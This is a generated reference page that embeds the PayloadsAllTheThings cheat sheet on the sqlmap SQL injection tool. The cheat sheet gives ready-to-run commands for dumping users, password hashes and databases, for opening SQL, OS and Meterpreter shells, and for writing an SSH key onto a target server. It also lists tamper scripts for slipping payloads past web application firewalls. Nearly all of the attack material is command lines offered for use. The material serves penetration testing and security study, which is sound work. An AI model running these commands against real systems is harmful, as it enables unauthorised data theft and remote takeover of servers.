---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# SQLmap

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-sql-injection-sqlmap` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/SQLmap.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [SQLmap](../../topics/sql-injection/sqlmap.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-sql-injection-sqlmap |
| name | SQLmap |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLmap.md |

## Preserved Source Material

````yaml
_body: "# SQLmap\n\n> SQLmap is a powerful tool that automates the detection and exploitation of SQL injection vulnerabilities,\
  \ saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making\
  \ it versatile and effective in various scenarios.\n> Additionally, SQLmap can retrieve data, manipulate databases, and\
  \ even execute commands, providing a robust set of features for penetration testers and security analysts.\n> Reinventing\
  \ the wheel isn't ideal because SQLmap has been rigorously developed, tested, and improved by experts. Using a reliable,\
  \ community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities\
  \ or introducing errors in custom code.\n> However you should always know how SQLmap is working, and be able to replicate\
  \ it manually if necessary.\n\n## Summary\n\n* [Basic Arguments For SQLmap](#basic-arguments-for-sqlmap)\n* [Load A Request\
  \ File](#load-a-request-file)\n* [Custom Injection Point](#custom-injection-point)\n* [Second Order Injection](#second-order-injection)\n\
  * [Getting A Shell](#getting-a-shell)\n* [Crawl And Auto-Exploit](#crawl-and-auto-exploit)\n* [Proxy Configuration For SQLmap](#proxy-configuration-for-sqlmap)\n\
  * [Injection Tampering](#injection-tampering)\n    * [Suffix And Prefix](#suffix-and-prefix)\n    * [Default Tamper Scripts](#default-tamper-scripts)\n\
  \    * [Custom Tamper Scripts](#custom-tamper-scripts)\n    * [Custom SQL Payload](#custom-sql-payload)\n    * [Evaluate\
  \ Python Code](#evaluate-python-code)\n    * [Preprocess And Postprocess Scripts](#preprocess-and-postprocess-scripts)\n\
  * [Reduce Requests Number](#reduce-requests-number)\n* [SQLmap Without SQL Injection](#sqlmap-without-sql-injection)\n*\
  \ [References](#references)\n\n## Basic Arguments For SQLmap\n\n```powershell\nsqlmap --url=\"<url>\" -p username --user-agent=SQLMAP\
  \ --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user\
  \ --dbs\n```\n\n## Load A Request File\n\nA request file in SQLmap is a saved HTTP request that SQLmap reads and uses to\
  \ perform SQL injection testing. This file allows you to provide a complete and custom HTTP request, which SQLmap can use\
  \ to target more complex applications.\n\n```powershell\nsqlmap -r request.txt\n```\n\n## Custom Injection Point\n\nA custom\
  \ injection point in SQLmap allows you to specify exactly where and how SQLmap should attempt to inject payloads into a\
  \ request. This is useful when dealing with more complex or non-standard injection scenarios that SQLmap may not detect\
  \ automatically.\n\nBy defining a custom injection point with the wildcard character '`*`' , you have finer control over\
  \ the testing process, ensuring SQLmap targets specific parts of the request you suspect to be vulnerable.\n\n```powershell\n\
  sqlmap -u \"http://example.com\" --data \"username=admin&password=pass\"  --headers=\"x-forwarded-for:127.0.0.1*\"\n```\n\
  \n## Second Order Injection\n\nA second-order SQL injection occurs when malicious SQL code injected into an application\
  \ is not executed immediately but is instead stored in the database and later used in another SQL query.\n\n```powershell\n\
  sqlmap -r /tmp/r.txt --dbms MySQL --second-order \"http://targetapp/wishlist\" -v 3\nsqlmap -r 1.txt -dbms MySQL -second-order\
  \ \"http://<IP/domain>/joomla/administrator/index.php\" -D \"joomla\" -dbs\n```\n\n## Getting A Shell\n\n* SQL Shell:\n\n\
  \    ```ps1\n    sqlmap -u \"http://example.com/?id=1\"  -p id --sql-shell\n    ```\n\n* OS Shell:\n\n    ```ps1\n    sqlmap\
  \ -u \"http://example.com/?id=1\"  -p id --os-shell\n    ```\n\n* Meterpreter:\n\n    ```ps1\n    sqlmap -u \"http://example.com/?id=1\"\
  \  -p id --os-pwn\n    ```\n\n* SSH Shell:\n\n    ```ps1\n    sqlmap -u \"http://example.com/?id=1\" -p id --file-write=/root/.ssh/id_rsa.pub\
  \ --file-destination=/home/user/.ssh/\n    ```\n\n## Crawl And Auto-Exploit\n\nThis method is not advisable for penetration\
  \ testing; it should only be used in controlled environments or challenges. It will crawl the entire website and automatically\
  \ submit forms, which may lead to unintended requests being sent to sensitive features like \"delete\" or \"destroy\" endpoints.\n\
  \n```powershell\nsqlmap -u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3\n\
  ```\n\n* `--batch` = Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers\n* `--crawl`\
  \ = How deep you want to crawl a site\n* `--forms` = Parse and test forms\n\n## Proxy Configuration For SQLmap\n\nTo run\
  \ SQLmap with a proxy, you can use the `--proxy` option followed by the proxy URL. SQLmap supports various types of proxies\
  \ such as HTTP, HTTPS, SOCKS4, and SOCKS5.\n\n```powershell\nsqlmap -u \"http://www.target.com\" --proxy=\"http://127.0.0.1:8080\"\
  \nsqlmap -u \"http://www.target.com/page.php?id=1\" --proxy=\"http://127.0.0.1:8080\" --proxy-cred=\"user:pass\"\n```\n\n\
  * HTTP Proxy:\n\n    ```ps1\n    --proxy=\"http://[username]:[password]@[proxy_ip]:[proxy_port]\"\n    --proxy=\"http://user:pass@127.0.0.1:8080\"\
  \n    ```\n\n* SOCKS Proxy:\n\n    ```ps1\n    --proxy=\"socks4://[username]:[password]@[proxy_ip]:[proxy_port]\"\n    --proxy=\"\
  socks4://user:pass@127.0.0.1:1080\"\n    ```\n\n* SOCKS5 Proxy:\n\n    ```ps1\n    --proxy=\"socks5://[username]:[password]@[proxy_ip]:[proxy_port]\"\
  \n    --proxy=\"socks5://user:pass@127.0.0.1:1080\"\n    ```\n\n## Injection Tampering\n\nIn SQLmap, tampering can help\
  \ you adjust the injection in specific ways required to bypass web application firewalls (WAFs) or custom sanitization mechanisms.\
  \ SQLmap provides various options and techniques to tamper with the payloads being used for SQL injection.\n\n### Suffix\
  \ And Prefix\n\nThe `--suffix` and `--prefix` options allow you to specify additional strings that should be appended or\
  \ prepended to the payloads generated by SQLMap. These options can be useful when the target application requires specific\
  \ formatting or when you need to bypass certain filters or protections.\n\n```powershell\nsqlmap -u \"http://example.com/?id=1\"\
  \  -p id --suffix=\"-- \"\n```\n\n* `--suffix=SUFFIX`: The `--suffix` option appends a specified string to the end of each\
  \ payload generated by SQLMap.\n* `--prefix=PREFIX`: The `--prefix` option prepends a specified string to the beginning\
  \ of each payload generated by SQLMap.\n\n### Default Tamper Scripts\n\nA tamper script  is a script that modifies the SQL\
  \ injection payloads to evade detection by WAFs or other security mechanisms. SQLmap comes with a variety of pre-built tamper\
  \ scripts that can be used to automatically adjust payloads\n\n```powershell\nsqlmap -u \"http://targetwebsite.com/vulnerablepage.php?id=1\"\
  \ --tamper=<tamper-script-name>\n```\n\nBelow is a table highlighting some of the most commonly used tamper scripts:\n\n\
  | Tamper | Description |\n| --- | --- |\n|0x2char.py | Replaces each (MySQL) 0xHEX encoded string with equivalent CONCAT(CHAR(),…)\
  \ counterpart |\n|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |\n|apostrophenullencode.py\
  \ | Replaces apostrophe character with its illegal double unicode counterpart|\n|appendnullbyte.py | Appends encoded NULL\
  \ byte character at the end of payload |\n|base64encode.py | Base64 all characters in a given payload  |\n|between.py |\
  \ Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |\n|bluecoat.py | Replaces space character after SQL statement\
  \ with a valid random blank character.Afterwards replace character = with LIKE operator  |\n|chardoubleencode.py | Double\
  \ url-encodes all characters in a given payload (not processing already encoded) |\n|charencode.py | URL-encodes all characters\
  \ in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) |\n|charunicodeencode.py | Unicode-URL-encodes\
  \ all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)\
  \ |\n|charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded)\
  \ (e.g. SELECT -> \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054) |\n|commalesslimit.py | Replaces instances like 'LIMIT M,\
  \ N' with 'LIMIT N OFFSET M'|\n|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|\n|commentbeforeparentheses.py\
  \ | Prepends (inline) comment before parentheses (e.g. ( -> /**/() |\n|concat2concatws.py | Replaces instances like 'CONCAT(A,\
  \ B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|\n|charencode.py | Url-encodes all characters in a given payload (not processing\
  \ already encoded)  |\n|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing\
  \ already encoded)  |\n|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |\n|escapequotes.py\
  \ | Slash escape quotes (' and \") |\n|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |\n\
  |halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |\n|htmlencode.py | HTML encode (using\
  \ code points) all non-alphanumeric characters (e.g. ' -> &#39;) |\n|ifnull2casewhenisnull.py | Replaces instances like\
  \ 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart|\n|ifnull2ifisnull.py | Replaces instances\
  \ like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|\n|informationschemacomment.py | Add an inline comment (/**/) to the end\
  \ of all occurrences of (MySQL) \"information_schema\" identifier |\n|least.py | Replaces greater than operator ('>') with\
  \ 'LEAST' counterpart |\n|lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -> select) |\n\
  |modsecurityversioned.py | Embraces complete query with versioned comment |\n|modsecurityzeroversioned.py | Embraces complete\
  \ query with zero-versioned comment |\n|multiplespaces.py | Adds multiple spaces around SQL keywords |\n|nonrecursivereplacement.py\
  \ | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(\"SELECT\", \"\")) filters|\n\
  |overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |\n|overlongutf8more.py |\
  \ Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)\
  \ |\n|percentage.py | Adds a percentage sign ('%') infront of each character  |\n|plus2concat.py | Replaces plus operator\
  \ ('+') with (MsSQL) function CONCAT() counterpart |\n|plus2fnconcat.py | Replaces plus operator ('+') with (MsSQL) ODBC\
  \ function {fn CONCAT()} counterpart |\n|randomcase.py | Replaces each keyword character with random case value |\n|randomcomments.py\
  \ | Add random comments to SQL keywords|\n|securesphere.py | Appends special crafted string |\n|sp_password.py |  Appends\
  \ 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |\n|space2comment.py | Replaces space\
  \ character (' ') with comments |\n|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by\
  \ a random string and a new line ('\\n') |\n|space2hash.py | Replaces space character (' ') with a pound character ('#')\
  \ followed by a random string and a new line ('\\n') |\n|space2morehash.py | Replaces space character (' ') with a pound\
  \ character ('#') followed by a random string and a new line ('\\n') |\n|space2mssqlblank.py | Replaces space character\
  \ (' ') with a random blank character from a valid set of alternate characters |\n|space2mssqlhash.py | Replaces space character\
  \ (' ') with a pound character ('#') followed by a new line ('\\n') |\n|space2mysqlblank.py | Replaces space character ('\
  \ ') with a random blank character from a valid set of alternate characters |\n|space2mysqldash.py | Replaces space character\
  \ (' ') with a dash comment ('--') followed by a new line ('\\n') |\n|space2plus.py |  Replaces space character (' ') with\
  \ plus ('+')  |\n|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of\
  \ alternate characters |\n|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&&\
  \ and \\|\\|) |\n|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |\n|unmagicquotes.py | Replaces quote\
  \ character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |\n|uppercase.py\
  \ | Replaces each keyword character with upper case value 'INSERT'|\n|varnish.py | Append a HTTP header 'X-originating-IP'\
  \ |\n|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |\n|versionedmorekeywords.py\
  \ | Encloses each keyword with versioned MySQL comment |\n|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'\
  \ |\n\n### Custom Tamper Scripts\n\nWhen creating a custom tamper script, there are a few things to keep in mind. The script\
  \ architecture contains these mandatory variables and functions:\n\n* `__priority__`: Defines the order in which tamper\
  \ scripts are applied.  This sets how early or late SQLmap should apply your tamper script in the tamper pipeline. Normal\
  \ priority is 0 and the highest is 100.\n* `dependencies()`: This function gets called before the tamper script is used.\n\
  * `tamper(payload)`: The main function that modifies the payload.\n\nThe following code is an example of a tamper script\
  \ that replace instances like '`LIMIT M, N`' with '`LIMIT N OFFSET M`' counterpart:\n\n```py\nimport os\nimport re\n\nfrom\
  \ lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n\
  __priority__ = PRIORITY.HIGH\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be\
  \ run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    retVal\
  \ = payload\n\n    match = re.search(r\"(?i)LIMIT\\s*(\\d+),\\s*(\\d+)\", payload or \"\")\n    if match:\n        retVal\
  \ = retVal.replace(match.group(0), \"LIMIT %s OFFSET %s\" % (match.group(2), match.group(1)))\n\n    return retVal\n```\n\
  \n* Save it as something like: `mytamper.py`\n* Place it inside SQLmap's `tamper/` directory, typically:\n\n    ```ps1\n\
  \    /usr/share/sqlmap/tamper/\n    ```\n\n* Use it with SQLmap\n\n    ```ps1\n    sqlmap -u \"http://target.com/vuln.php?id=1\"\
  \ --tamper=mytamper\n    ```\n\n### Custom SQL Payload\n\nThe `--sql-query` option in SQLmap is used to manually run your\
  \ own SQL query on a vulnerable database after SQLmap has confirmed the injection and gathered necessary access.\n\n```ps1\n\
  sqlmap -u \"http://example.com/vulnerable.php?id=1\" --sql-query=\"SELECT version()\"\n```\n\n### Evaluate Python Code\n\
  \nThe `--eval` option lets you define or modify request parameters using Python. The evaluated variables can then be used\
  \ inside the URL, headers, cookies, etc.\n\nParticularly useful in scenarios such as:\n\n* **Dynamic parameters**: When\
  \ a parameter needs to be randomly or sequentially generated.\n* **Token generation**: For handling CSRF tokens or dynamic\
  \ auth headers.\n* **Custom logic**: E.g., encoding, encryption, timestamps, etc.\n\n```ps1\nsqlmap -u \"http://example.com/vulnerable.php?id=1\"\
  \ --eval=\"import random; id=random.randint(1,10)\"\nsqlmap -u \"http://example.com/vulnerable.php?id=1\" --eval=\"import\
  \ hashlib;id2=hashlib.md5(id).hexdigest()\"\n```\n\n### Preprocess And Postprocess Scripts\n\n```ps1\nsqlmap -u 'http://example.com/vulnerable.php?id=1'\
  \ --preprocess=preprocess.py --postprocess=postprocess.py\n```\n\n#### Preprocessing Script (preprocess.py)\n\nThe preprocessing\
  \ script is used to modify the request data before it is sent to the target application. This can be useful for encoding\
  \ parameters, adding headers, or other request modifications.\n\n```ps1\n--preprocess=preprocess.py    Use given script(s)\
  \ for preprocessing (request)\n```\n\n**Example preprocess.py**:\n\n```ps1\n#!/usr/bin/env python\ndef preprocess(req):\n\
  \    print(\"Preprocess\")\n    print(req)\n```\n\n#### Postprocessing Script (postprocess.py)\n\nThe postprocessing script\
  \ is used to modify the response data after it is received from the target application. This can be useful for decoding\
  \ responses, extracting specific data, or other response modifications.\n\n```ps1\n--postprocess=postprocess.py  Use given\
  \ script(s) for postprocessing (response)\n```\n\n## Reduce Requests Number\n\nThe parameter `--test-filter` is helpful\
  \ when you want to focus on specific types of SQL injection techniques or payloads. Instead of testing the full range of\
  \ payloads that SQLMap has, you can limit it to those that match a certain pattern, making the process more efficient, especially\
  \ on large or slow web applications.\n\n```ps1\nsqlmap -u \"https://www.target.com/page.php?category=demo\" -p category\
  \ --test-filter=\"Generic UNION query (NULL)\"\nsqlmap -u \"https://www.target.com/page.php?category=demo\" --test-filter=\"\
  boolean\"\n```\n\nBy default, SQLmap runs with level 1 and risk 1, which generates fewer requests. Increasing these values\
  \ without a purpose may lead to a larger number of tests that are time-consuming and unnecessary.\n\n```ps1\nsqlmap -u \"\
  https://www.target.com/page.php?id=1\" --level=1 --risk=1\n```\n\nUse the `--technique` option to specify the types of SQL\
  \ injection techniques to test for, rather than testing all possible ones.\n\n```ps1\nsqlmap -u \"https://www.target.com/page.php?id=1\"\
  \ --technique=B\n```\n\n## SQLmap Without SQL Injection\n\nUsing SQLmap without exploiting SQL injection vulnerabilities\
  \ can still be useful for various legitimate purposes, particularly in security assessments, database management, and application\
  \ testing.\n\nYou can use SQLmap to access a database via its port instead of a URL.\n\n```ps1\nsqlmap -d \"mysql://user:pass@ip/database\"\
  \ --dump-all\n```\n\n## References\n\n* [#SQLmap protip - @zh4ck - March 10, 2018](https://web.archive.org/web/20240827145141/https://twitter.com/zh4ck/status/972441560875970560)\n\
  * [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper - Mehmet Ince - August 1, 2017](https://web.archive.org/web/20170802071522/https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)"
_relative_path: SQL Injection/SQLmap.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/SQLmap.md
````
